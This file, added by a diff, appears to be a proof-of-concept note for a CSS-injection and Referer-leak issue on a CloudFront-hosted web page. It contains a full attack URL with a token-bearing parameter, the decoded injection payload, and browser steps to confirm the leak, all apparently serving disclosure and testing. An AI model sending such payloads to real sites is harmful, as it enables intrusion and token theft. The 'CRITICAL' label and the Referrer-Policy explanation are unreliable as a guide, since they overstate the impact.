@@ -1,0 +1,21 @@
+CRITICAL: Same-Origin Referer Leak Attack
+==========================================
+
+Attack URL (open in browser, check Network tab):
+
+https://d2pneqdaei3b3x.cloudfront.net/index.html?_to=eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJ0b2tlbl90eXBlIjoiYWNjZXNzIiwiZXhwIjoxNzY0NjUzODQ4LCJpYXQiOjE3NjQ2NTMyNDgsImp0aSI6IjYyNTk3NmYwZTdhNDQzMGE5YzY4NTMwOGNmYWFiNzA0IiwidXNlcl91c2VyX3V1aWQiOiI2OTFlMjEzNi00OGJiLTRlNTUtOTMxOC1hNTk0YWM5YzNjZWMifQ.TEST&_fn=x%27%3B%7D*%7Bbackground%3Aurl%28%27%2Fassets%2Flogo-ripio.svg%27%29%21important%7D%2F*&_fo=y
+
+Payload decoded:
+_fn=x';}*{background:url('/assets/logo-ripio.svg')!important}/*
+
+What to check:
+1. Open URL in Chrome
+2. Open DevTools (F12) -> Network tab
+3. Find request to /assets/logo-ripio.svg (or any other asset)
+4. Click on it -> Headers -> Look at "Referer" header
+5. If Referer contains FULL URL with _to=JWT... -> CRITICAL CONFIRMED!
+
+Why this works:
+- Same-origin requests bypass Referrer-Policy restrictions
+- Browser sends full URL in Referer for same-origin requests
+- The JWT token in _to parameter leaks to CloudFront logs
